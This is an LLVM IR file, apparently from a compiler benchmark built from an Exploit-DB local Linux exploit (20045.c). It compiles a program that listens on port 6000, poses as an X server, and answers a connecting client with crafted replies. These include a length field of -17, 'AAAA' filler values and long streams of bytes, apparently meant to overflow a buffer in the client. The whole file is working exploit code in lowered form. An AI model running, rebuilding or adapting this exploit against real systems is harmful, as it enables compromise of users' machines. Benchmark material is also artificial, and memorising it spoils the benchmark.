; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_20045.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_20045.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, %struct.TYPE_2__, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@main.port = internal global i32 6000, align 4
@PF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@AF_INET = common dso_local global i32 0, align 4
@INADDR_ANY = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [11 x i8] c"to_go: %u\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [32768 x i8], align 16
  %7 = alloca [1024 x i8], align 16
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8, align 1
  %14 = alloca i16, align 2
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %18 = load i32, i32* @PF_INET, align 4
  %19 = load i32, i32* @SOCK_STREAM, align 4
  %20 = call i32 @socket(i32 %18, i32 %19, i32 6)
  store i32 %20, i32* %11, align 4
  %21 = load i32, i32* @AF_INET, align 4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  store i32 %21, i32* %22, align 4
  %23 = load i32, i32* @INADDR_ANY, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  %25 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %24, i32 0, i32 0
  store i32 %23, i32* %25, align 4
  %26 = load i32, i32* @main.port, align 4
  %27 = call i32 @htons(i32 %26)
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i32 %27, i32* %28, align 4
  %29 = load i32, i32* %11, align 4
  %30 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %31 = call i32 @bind(i32 %29, %struct.sockaddr* %30, i32 12)
  %32 = load i32, i32* %11, align 4
  %33 = call i32 @listen(i32 %32, i32 1)
  %34 = load i32, i32* %11, align 4
  %35 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %36 = call i32 @accept(i32 %34, %struct.sockaddr* %35, i32* %10)
  store i32 %36, i32* %12, align 4
  %37 = load i32, i32* %12, align 4
  %38 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %39 = call i32 @read(i32 %37, i8* %38, i32 12)
  %40 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 6
  %41 = bitcast i8* %40 to i16*
  %42 = load i16, i16* %41, align 2
  store i16 %42, i16* %14, align 2
  %43 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 8
  %44 = bitcast i8* %43 to i16*
  %45 = load i16, i16* %44, align 8
  %46 = sext i16 %45 to i32
  %47 = load i16, i16* %14, align 2
  %48 = sext i16 %47 to i32
  %49 = add nsw i32 %48, %46
  %50 = trunc i32 %49 to i16
  store i16 %50, i16* %14, align 2
  %51 = load i32, i32* %12, align 4
  %52 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %53 = load i16, i16* %14, align 2
  %54 = sext i16 %53 to i32
  %55 = call i32 @read(i32 %51, i8* %52, i32 %54)
  store i8 1, i8* %13, align 1
  %56 = load i32, i32* %12, align 4
  %57 = call i32 (i32, ...) @write(i32 %56, i8* %13, i32 1)
  store i8 0, i8* %13, align 1
  %58 = load i32, i32* %12, align 4
  %59 = call i32 (i32, ...) @write(i32 %58, i8* %13, i32 1)
  store i16 11, i16* %14, align 2
  %60 = load i32, i32* %12, align 4
  %61 = call i32 (i32, ...) @write(i32 %60, i16* %14, i32 2)
  store i16 0, i16* %14, align 2
  %62 = load i32, i32* %12, align 4
  %63 = call i32 (i32, ...) @write(i32 %62, i16* %14, i32 2)
  store i16 18, i16* %14, align 2
  %64 = load i32, i32* %12, align 4
  %65 = call i32 (i32, ...) @write(i32 %64, i16* %14, i32 2)
  store i32 0, i32* %15, align 4
  %66 = load i32, i32* %12, align 4
  %67 = call i32 (i32, ...) @write(i32 %66, i32* %15, i32 4)
  store i32 0, i32* %15, align 4
  %68 = load i32, i32* %12, align 4
  %69 = call i32 (i32, ...) @write(i32 %68, i32* %15, i32 4)
  store i32 1, i32* %15, align 4
  %70 = load i32, i32* %12, align 4
  %71 = call i32 (i32, ...) @write(i32 %70, i32* %15, i32 4)
  store i32 0, i32* %15, align 4
  %72 = load i32, i32* %12, align 4
  %73 = call i32 (i32, ...) @write(i32 %72, i32* %15, i32 4)
  store i16 0, i16* %14, align 2
  %74 = load i32, i32* %12, align 4
  %75 = call i32 (i32, ...) @write(i32 %74, i16* %14, i32 2)
  store i16 0, i16* %14, align 2
  %76 = load i32, i32* %12, align 4
  %77 = call i32 (i32, ...) @write(i32 %76, i16* %14, i32 2)
  store i8 1, i8* %13, align 1
  %78 = load i32, i32* %12, align 4
  %79 = call i32 (i32, ...) @write(i32 %78, i8* %13, i32 1)
  store i8 0, i8* %13, align 1
  %80 = load i32, i32* %12, align 4
  %81 = call i32 (i32, ...) @write(i32 %80, i8* %13, i32 1)
  store i8 0, i8* %13, align 1
  %82 = load i32, i32* %12, align 4
  %83 = call i32 (i32, ...) @write(i32 %82, i8* %13, i32 1)
  store i8 0, i8* %13, align 1
  %84 = load i32, i32* %12, align 4
  %85 = call i32 (i32, ...) @write(i32 %84, i8* %13, i32 1)
  store i8 0, i8* %13, align 1
  %86 = load i32, i32* %12, align 4
  %87 = call i32 (i32, ...) @write(i32 %86, i8* %13, i32 1)
  store i8 0, i8* %13, align 1
  %88 = load i32, i32* %12, align 4
  %89 = call i32 (i32, ...) @write(i32 %88, i8* %13, i32 1)
  store i8 0, i8* %13, align 1
  %90 = load i32, i32* %12, align 4
  %91 = call i32 (i32, ...) @write(i32 %90, i8* %13, i32 1)
  store i8 0, i8* %13, align 1
  %92 = load i32, i32* %12, align 4
  %93 = call i32 (i32, ...) @write(i32 %92, i8* %13, i32 1)
  store i32 0, i32* %15, align 4
  %94 = load i32, i32* %12, align 4
  %95 = call i32 (i32, ...) @write(i32 %94, i32* %15, i32 4)
  %96 = getelementptr inbounds [32768 x i8], [32768 x i8]* %6, i64 0, i64 0
  %97 = call i32 @memset(i8* %96, i8 signext 0, i32 40)
  %98 = load i32, i32* %12, align 4
  %99 = getelementptr inbounds [32768 x i8], [32768 x i8]* %6, i64 0, i64 0
  %100 = call i32 (i32, ...) @write(i32 %98, i8* %99, i32 40)
  %101 = load i32, i32* %12, align 4
  %102 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %103 = call i32 @read(i32 %101, i8* %102, i32 64)
  store i8 1, i8* %13, align 1
  %104 = load i32, i32* %12, align 4
  %105 = call i32 (i32, ...) @write(i32 %104, i8* %13, i32 1)
  store i8 0, i8* %13, align 1
  %106 = load i32, i32* %12, align 4
  %107 = call i32 (i32, ...) @write(i32 %106, i8* %13, i32 1)
  store i16 2, i16* %14, align 2
  %108 = load i32, i32* %12, align 4
  %109 = call i32 (i32, ...) @write(i32 %108, i16* %14, i32 2)
  store i32 -17, i32* %15, align 4
  %110 = load i32, i32* %12, align 4
  %111 = call i32 (i32, ...) @write(i32 %110, i32* %15, i32 4)
  store i32 1094795585, i32* %15, align 4
  %112 = load i32, i32* %12, align 4
  %113 = call i32 (i32, ...) @write(i32 %112, i32* %15, i32 4)
  %114 = load i32, i32* %12, align 4
  %115 = call i32 (i32, ...) @write(i32 %114, i32* %15, i32 4)
  %116 = load i32, i32* %12, align 4
  %117 = call i32 (i32, ...) @write(i32 %116, i32* %15, i32 4)
  %118 = load i32, i32* %12, align 4
  %119 = call i32 (i32, ...) @write(i32 %118, i32* %15, i32 4)
  %120 = load i32, i32* %12, align 4
  %121 = call i32 (i32, ...) @write(i32 %120, i32* %15, i32 4)
  %122 = load i32, i32* %12, align 4
  %123 = call i32 (i32, ...) @write(i32 %122, i32* %15, i32 4)
  store i8 0, i8* %13, align 1
  store i32 -17, i32* %16, align 4
  %124 = load i32, i32* %16, align 4
  %125 = shl i32 %124, 2
  store i32 %125, i32* %16, align 4
  br label %126

126:                                              ; preds = %147, %2
  %127 = load i32, i32* %16, align 4
  %128 = icmp ugt i32 %127, 0
  br i1 %128, label %129, label %150

129:                                              ; preds = %126
  %130 = load i32, i32* %16, align 4
  store i32 %130, i32* %17, align 4
  %131 = load i32, i32* %17, align 4
  %132 = icmp ugt i32 %131, 32768
  br i1 %132, label %133, label %134

133:                                              ; preds = %129
  store i32 32768, i32* %17, align 4
  br label %134

134:                                              ; preds = %133, %129
  %135 = load i32, i32* %12, align 4
  %136 = getelementptr inbounds [32768 x i8], [32768 x i8]* %6, i64 0, i64 0
  %137 = load i32, i32* %17, align 4
  %138 = call i32 (i32, ...) @write(i32 %135, i8* %136, i32 %137)
  %139 = load i32, i32* %17, align 4
  %140 = load i32, i32* %16, align 4
  %141 = sub i32 %140, %139
  store i32 %141, i32* %16, align 4
  %142 = load i8, i8* %13, align 1
  %143 = icmp ne i8 %142, 0
  br i1 %143, label %147, label %144

144:                                              ; preds = %134
  %145 = load i32, i32* %16, align 4
  %146 = call i32 @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str, i64 0, i64 0), i32 %145)
  br label %147

147:                                              ; preds = %144, %134
  %148 = load i8, i8* %13, align 1
  %149 = add i8 %148, 1
  store i8 %149, i8* %13, align 1
  br label %126

150:                                              ; preds = %126
  %151 = getelementptr inbounds [32768 x i8], [32768 x i8]* %6, i64 0, i64 0
  %152 = call i32 @memset(i8* %151, i8 signext 65, i32 28)
  %153 = load i32, i32* %12, align 4
  %154 = getelementptr inbounds [32768 x i8], [32768 x i8]* %6, i64 0, i64 0
  %155 = call i32 (i32, ...) @write(i32 %153, i8* %154, i32 28)
  %156 = getelementptr inbounds [32768 x i8], [32768 x i8]* %6, i64 0, i64 0
  %157 = call i32 @memset(i8* %156, i8 signext 0, i32 32)
  %158 = load i32, i32* %12, align 4
  %159 = getelementptr inbounds [32768 x i8], [32768 x i8]* %6, i64 0, i64 0
  %160 = call i32 (i32, ...) @write(i32 %158, i8* %159, i32 32)
  br label %161

161:                                              ; preds = %150, %161
  br label %161
}

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @bind(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @listen(i32, i32) #1

declare dso_local i32 @accept(i32, %struct.sockaddr*, i32*) #1

declare dso_local i32 @read(i32, i8*, i32) #1

declare dso_local i32 @write(i32, ...) #1

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

declare dso_local i32 @printf(i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
